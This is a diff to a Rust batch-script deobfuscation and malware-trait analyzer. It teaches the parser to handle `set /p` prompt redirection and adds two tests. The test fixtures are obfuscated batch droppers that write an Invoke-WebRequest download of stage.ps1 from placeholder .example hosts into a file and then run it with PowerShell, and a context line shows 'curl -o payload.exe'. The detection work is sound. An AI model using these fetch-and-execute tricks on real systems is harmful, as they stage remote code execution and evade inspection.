@@ -782,6 +782,56 @@ curl -o payload.exe %U%"#,
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn grouped_set_p_prompt_redirect_joins_generated_script_without_newline() {
+        let report = analyze(
+            br#"(
+<nul set /p "=Invoke-WebRequest -Uri h"
+<nul set /p "=ttps://grouped-set-p-prompt.example/stage.ps1"
+) > stage.ps1
+powershell -NoProfile -File .\stage.ps1"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://grouped-set-p-prompt.example/stage.ps1"
+                )
+            }),
+            "grouped set /p prompt redirection did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn grouped_mixed_set_p_echo_redirect_joins_generated_script() {
+        let report = analyze(
+            br#"(
+<nul set /p "=Invoke-WebRequest -Uri h"
+echo ttps://grouped-mixed-set-p-echo.example/stage.ps1
+) > stage.ps1
+powershell -NoProfile -File .\stage.ps1"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://grouped-mixed-set-p-echo.example/stage.ps1"
+                )
+            }),
+            "grouped mixed set /p and echo redirection did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
@@ -9460,7 +9510,10 @@ struct EchoRedirectPrescanShapes {
 }
 
 fn echo_redirect_prescan_shapes(input: &[u8]) -> EchoRedirectPrescanShapes {
-    if !contains_ascii_case_insensitive_bytes(input, b"echo") || !input.contains(&b'>') {
+    if !(contains_ascii_case_insensitive_bytes(input, b"echo")
+        || contains_ascii_case_insensitive_bytes(input, b"set /p"))
+        || !input.contains(&b'>')
+    {
         return EchoRedirectPrescanShapes::default();
     }
 
@@ -9506,7 +9559,7 @@ fn echo_redirect_prescan_shapes(input: &[u8]) -> EchoRedirectPrescanShapes {
             saw_redirected_group_open = false;
         }
 
-        if block_echo_payload(trimmed).is_some() && trimmed.contains('>') {
+        if block_stdout_chunk(trimmed).is_some() && trimmed.contains('>') {
             echo_redirect_lines += 1;
             if echo_redirect_lines >= 2 {
                 shapes.top_level_run = true;
@@ -9516,7 +9569,7 @@ fn echo_redirect_prescan_shapes(input: &[u8]) -> EchoRedirectPrescanShapes {
             }
             continue;
         }
-        if block_echo_payload(trimmed).is_none() {
+        if block_stdout_chunk(trimmed).is_none() {
             echo_redirect_lines = 0;
         }
     }
@@ -9562,9 +9615,9 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
             i += 1;
             continue;
         }
-        // Scan the body, collecting echo payloads until the closing `)`.
+        // Scan the body, collecting stdout payloads until the closing `)`.
         let mut j = i + 1;
-        let mut payloads: Vec<String> = Vec::new();
+        let mut payloads: Vec<BlockStdoutChunk> = Vec::new();
         let mut body_is_all_echo = true;
         let mut close_idx: Option<usize> = None;
         while j < lines.len() {
@@ -9578,9 +9631,8 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
                 j += 1;
                 continue;
             }
-            // Recognize `echo X` / `echo.X` / `echo:X` / bare `echo`.
-            if let Some(payload) = block_echo_payload(body) {
-                payloads.push(payload.to_string());
+            if let Some(payload) = block_stdout_chunk(body) {
+                payloads.push(payload);
             } else {
                 body_is_all_echo = false;
                 break;
@@ -9628,17 +9680,19 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
         } else {
             crate::redirect::RedirTarget::Trunc(target_expanded)
         };
-        // Build the file content: each echo line var-expanded, joined by CRLF
-        // (matching CMD's per-echo newline), with a trailing CRLF.
+        // Build the file content: each stdout chunk var-expanded. Echo adds
+        // CMD's normal newline; `set /p` prompts do not.
         let mut content = String::new();
         for p in &payloads {
-            let toks = lex::lex(p);
+            let toks = lex::lex(&p.text);
             // Same scratch env as the target — keeps echo bodies that
             // reference earlier SET vars (`echo %url% > file`) consistent
             // with how the redirect target was resolved.
             let expanded = normalize::normalize_to_string(&toks, &mut scratch);
             content.push_str(&expanded);
-            content.push_str("\r\n");
+            if p.newline {
+                content.push_str("\r\n");
+            }
         }
         let key = target.path().to_ascii_lowercase();
         let cap = env.limits.max_output_bytes as usize;
@@ -9677,6 +9731,50 @@ fn block_echo_payload(body: &str) -> Option<&str> {
         Some(b'.') | Some(b':') => Some(rest[1..].trim_start()),
         _ => None,
     }
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct BlockStdoutChunk {
+    text: String,
+    newline: bool,
+}
+
+fn block_stdout_chunk(body: &str) -> Option<BlockStdoutChunk> {
+    if let Some(payload) = block_echo_payload(body) {
+        return Some(BlockStdoutChunk {
+            text: payload.to_string(),
+            newline: true,
+        });
+    }
+    block_set_p_prompt_payload(body).map(|text| BlockStdoutChunk {
+        text,
+        newline: false,
+    })
+}
+
+fn block_set_p_prompt_payload(body: &str) -> Option<String> {
+    let (cleaned, redir) = crate::redirect::extract_redirections(body);
+    let stdin = redir.stdin?;
+    if !stdin.eq_ignore_ascii_case("nul") {
+        return None;
+    }
+
+    let cmd = cleaned.trim_start_matches(['@', ' ', '\t']);
+    if !starts_with_ascii_case_insensitive(cmd, "set ") {
+        return None;
+    }
+    let after_set = cmd["set".len()..].trim_start();
+    if !starts_with_ascii_case_insensitive(after_set, "/p") {
+        return None;
+    }
+    let after_p = after_set["/p".len()..].trim_start();
+    let assignment = if after_p.starts_with('"') && after_p.ends_with('"') && after_p.len() >= 2 {
+        &after_p[1..after_p.len() - 1]
+    } else {
+        after_p
+    };
+    let (_, prompt) = assignment.split_once('=')?;
+    Some(prompt.to_string())
 }
 
 fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u32) {
